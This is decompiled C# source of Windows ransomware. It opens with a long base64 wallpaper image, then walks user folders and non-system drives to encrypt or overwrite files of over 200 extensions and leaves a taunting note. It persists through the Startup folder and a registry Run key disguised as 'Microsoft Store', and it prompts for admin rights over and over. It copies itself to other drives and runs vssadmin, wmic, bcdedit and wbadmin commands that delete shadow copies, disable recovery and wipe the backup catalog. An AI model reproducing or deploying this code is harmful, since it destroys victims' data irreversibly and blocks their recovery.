+bLc9CBj2qqOGkpe/fRt9Lf5nHxFxjhq2FnLL3TvVpQpzUlV9r7u/wD06sns0727no3xU/5If4b/AO3X/wBJ2o+Kn/JD/Df/AG6/+k7VzVh8VIrjwrDpWtaZ/bENrIrQH7SbfylVNir8i5OBu5J7+1Hjn4qReLvCtppUGmfYIbKRGjP2ky4VUZAvKg9D1z2qYUKilFW2bd9Dsx/E+U18Niq8K65quHhTUOWfNzR3u+Xkt2amzjqK6H4b+O/+Ffa5LefZftfmQGHZ5vl4yytnOD/d/Wj4keO/+Fg65FefZfsnlwCHZ5vmZwzNnOB/e/Su7mnz8vLp3/4B+Y/UsB/Z31n6z+/vb2XJLbvz/D8jnqKKK0PGCiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigDW1Xxvqmt6Hbabc3Pm2Vpt8qPy0GzapVeQMngnqayaKKSio6JHRicXXxM/aYibm7JXk23ZbLXougUUUUznCiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigD//Z";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "goreadmetxt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[4] { "Did you know that this virus is inescapable?", "", "Yep, cry about it, little baby.", "" };

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
